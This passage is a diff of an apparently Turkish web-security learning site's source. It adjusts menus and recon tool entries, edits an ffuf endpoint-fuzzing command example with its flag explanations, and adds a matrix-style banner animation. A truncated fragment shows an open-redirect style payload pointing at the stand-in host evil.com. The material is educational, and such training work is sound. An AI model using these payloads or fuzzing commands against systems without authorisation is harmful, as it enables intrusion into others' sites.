+              <code style="background:rgba(0,0,0,0.2);padding:2px 6px;border-radius:4px;font-size:14px;">&lt;&gt;//evil.com</code>
+          </div>
+      </li>
+  </ul>`
+}
         ]
       },
 
@@ -3453,7 +3571,7 @@ POST /api/users/update
 
       tools: {
         menuName: 'Araçlar',
-        icon: 'icon-shield-bolt',
+        icon: 'icon-terminal',
         title: 'Araçlar ve Kullanımları',
         description: 'Siber güvenlik çalışmalarında kullanılan araçların listesi ve kısa kullanım notları.',
         sections: [
@@ -3775,7 +3893,7 @@ POST /api/users/update
 
       toolbox: {
         menuName: 'ToolBox',
-        icon: 'icon-terminal',
+        icon: 'icon-shield-bolt',
         title: 'Siber Güvenlik Araçları',
         description: 'Uygulama güvenliği testlerinizi doğrudan tarayıcı üzerinden gerçekleştirin.<br><br>',
         categories: [
@@ -3785,8 +3903,8 @@ POST /api/users/update
               { id: 'subdomainfinder', icon: 'fa-solid fa-magnifying-glass', title: 'Subdomain Finder', description: 'Bir alan adının gizli alt alan adlarını keşfedin.' },
               { id: 'waybackRecon', icon: 'fa-solid fa-clock-rotate-left', title: 'Wayback Hunting with 1Recon', description: "Tek komutla saldırı yüzeyini arşa çıkarın. Unutulmuş endpoint'leri ve gizli zafiyet adaylarını avlayın." },
               { id: 'techdetect', icon: 'fa-solid fa-microchip', title: 'Teknoloji Tespiti', description: 'Bir web sitesinin hangi teknolojilerle yapıldığını analiz edin.' },
-              { id: 'dnslookup', icon: 'fa-solid fa-book-atlas', title: 'DNS Kayıt Sorgulama ❌', description: 'Bir domainin DNS kayıtlarını (A, MX, CNAME vb.) sorgulayın.' },
-              { id: 'whois', icon: 'fa-solid fa-user-secret', title: 'Whois Sorgulama ❌', description: 'Domain sahiplik ve kayıt bilgilerini anında öğrenin.' }
+              { id: 'dnslookup', icon: 'fa-solid fa-book-atlas', title: 'DNS Kayıt Sorgulama', description: 'Bir domainin DNS kayıtlarını (A, MX, CNAME vb.) sorgulayın.' },
+              { id: 'whois', icon: 'fa-solid fa-user-secret', title: 'Whois Sorgulama', description: 'Domain sahiplik ve kayıt bilgilerini anında öğrenin.' }
             ]
           },
           {
@@ -4094,7 +4212,7 @@ POST /api/users/update
             <li style="background:rgba(255,255,255,0.02);padding:10px;border-radius:8px;color:#e6eef6;font-size:14px">
               <strong>3- Endpoint Keşfi (FFUF):</strong><br>
               <div style="display:flex;align-items:center;gap:8px">
-                <pre style="margin:0;white-space:pre-wrap">ffuf -u https://message.example.com/FUZZ -w ../wordlist.txt -mc 200,403 -fc 404 -fs 1234 -recursion</pre>
+                <pre style="margin:0;white-space:pre-wrap">ffuf -u https://message.example.com/FUZZ -w ../wordlist.txt -recursion</pre>
                 <button style="padding:6px;border-radius:6px;border:1px solid rgba(0,0,0,0.08);background:transparent;cursor:pointer;color:#e6eef6"
                   onclick="(function(b){navigator.clipboard.writeText(b.previousElementSibling.innerText);b.innerText='Kopyalandı';setTimeout(()=>b.innerText='💥',1200);})(this)">💥</button>
               </div>
@@ -4103,7 +4221,7 @@ POST /api/users/update
               <br><br>
               <code>-mc</code> parametresi ile 200, 3xx ve 4xx gibi istenilen durum kodları yakalanır.<br>
               <code>-fc</code> parametresi ile 200, 3xx ve 4xx gibi istenmeyen durum kodları elenir.<br>
-              <code>-fs 4512</code> ile belirli boyuttaki (false-positive) cevaplar elenir.<br>
+              <code>-fs</code> ile belirli boyuttaki (false-positive) cevaplar elenir.<br>
               <code>-recursion</code> sayesinde bulunan dizinlerin altındaki endpointler de otomatik olarak taranır.<br>
               <code>-e .php,.json,.bak</code> ile belirli dosya uzantıları hedeflenebilir.<br>
               <code>-H "Authorization: Bearer TOKEN"</code> eklenerek yetkili (authenticated) endpoint keşfi yapılabilir.<br>
@@ -4272,29 +4390,22 @@ function showPage(pageId) {
         main.innerHTML = `
         <div class="search-bar">
             <input type="text" id="searchInput" placeholder="Zafiyet, araç veya metodoloji ara..." aria-label="Ara" autocomplete="off" />
-            <span class="search-icon">🔍</span>
+            <span class="search-icon"></span>
             <div id="searchSuggestions" class="search-suggestions" role="listbox" aria-label="Arama önerileri" hidden></div>
         </div>
-        
-        <div class="hero" style="background: linear-gradient(135deg, rgba(1, 1, 1, 0.2), rgba(124, 58, 237, 0.2)); border: 1px solid rgba(255,255,255,0.05); padding: 40px; margin-bottom: 30px;">
-        <h1 style="
-            font-size: 38px;
-            margin-bottom: 12px;
-            font-family: monospace;
-            background: linear-gradient(180deg, #b38cff, #8f5fe8);
-            -webkit-background-clip: text;
-            color: transparent;
-            -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 6px rgba(179, 140, 255, 0.4), 0 0 12px rgba(143, 95, 232, 0.25);
-        ">
-            &gt; DARK_SECURITY_INIT: SUCCESS
-        </h1>
-
-            <p class="subtitle" style="font-size: 17px; color: #cbd5e1; line-height: 1.6; font-family: monospace;">
-                [INFO] >> Gerçek dünya senaryoları - Pratik Araçlar - Zafiyet Analizi! <<<br>[WARNING] Yalnızca yetkiniz olan hedeflerde test yapın!"
+        <div class="hero" style="position: relative; overflow: hidden; background: rgba(1, 1, 1, 0.4); border: 1px solid rgba(255,255,255,0.05); padding: 40px; margin-bottom: 30px;">
+            <canvas id="matrixCanvas" style="position:absolute; top:0; left:0; width:100%; height:100%; z-index: 1; pointer-events:none; opacity:0.12;"></canvas>
+            
+            <div style="position: relative; z-index: 2; width: fit-content;">
+                <h1 style="font-size: 38px; margin-bottom: 12px; font-family: monospace; background: linear-gradient(180deg, #b38cff, #8f5fe8); -webkit-background-clip: text; color: transparent; text-shadow: 0 0 6px rgba(179, 140, 255, 0.4);">
+                    &gt; DARK_SECURITY_INIT: SUCCESS
+                </h1>
+            </div>
+            <p class="subtitle" style="position: relative; z-index: 2; font-size: 17px; color: #cbd5e1; line-height: 1.6; font-family: monospace;">
+                [INFO] >> Gerçek dünya senaryoları - Pratik Araçlar - Zafiyet Analizi! <br>
+                [WARNING] Yalnızca yetkiniz olan hedeflerde test yapın!
             </p>
         </div>
-
         <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
             
             <div style="display: flex; flex-direction: column; gap: 15px;">
@@ -4445,7 +4556,43 @@ function showPage(pageId) {
         top: 0,
         behavior: 'smooth'
       });
+
+      const canvas = document.getElementById('matrixCanvas');
+      if (canvas) {
+          const ctx = canvas.getContext('2d');
+          const parent = canvas.parentElement;
+          canvas.width = parent.offsetWidth;
+          canvas.height = parent.offsetHeight;
+
+          const chars = "0101010101010101ABCDEFHIJKLMNOPQRSTUVXYZ@#$%&*+-".split("");
+          const fontSize = 14;
+          const columns = canvas.width / fontSize;
+          const drops = [];
+
+          for (let x = 0; x < columns; x++) drops[x] = 1;
+
+          function drawMatrix() {
+              ctx.fillStyle = "rgba(9, 9, 11, 0.1)"; 
+              ctx.fillRect(0, 0, canvas.width, canvas.height);
+
+              ctx.fillStyle = "#8b5cf6";
+              ctx.font = fontSize + "px monospace";
+
+              for (let i = 0; i < drops.length; i++) {
+                  const text = chars[Math.floor(Math.random() * chars.length)];
+                  ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+
+                  if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) {
+                      drops[i] = 0;
+                  }
+                  drops[i]++;
+              }
+          }
+          const matrixInterval = setInterval(drawMatrix, 50);
+          window.addEventListener('hashchange', () => clearInterval(matrixInterval), { once: true });
+      }
     }
+    
     function activateSubfinder() {
       const scanButton = document.getElementById('scanButton');
       const domainInput = document.getElementById('domainInput');
@@ -5927,5 +6074,4 @@ view</textarea>
     </svg>
   </button>
 </body>
-
 </html>
